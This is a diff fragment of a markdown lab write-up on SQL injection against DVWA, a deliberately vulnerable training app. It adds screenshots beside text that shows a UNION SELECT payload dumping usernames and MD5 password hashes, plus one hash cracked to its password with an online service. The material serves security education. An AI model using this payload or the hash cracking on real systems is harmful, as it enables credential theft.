@@ -168,13 +168,20 @@ Enter -> `1' UNION SELECT user,password FROM users-- -`
 
 It returns all the usernames and the **MD5 hash** which we crackk to get the passwords
 
+![table](./tablehashgord.png)
+
 we crack hashes using `https://crackstation.net/` (CrackStation)
+
+![Crack](./gordcrack.png)
 
 First name: gordonb
 
 Surname: e99a18c428cb38d5f260853678922e03
 
 Cracked: abc123
+
+![login](./gordlog.png)
+![login](./gordonb.png)
 
 # SQL Injection on DVWA Medium Security
 
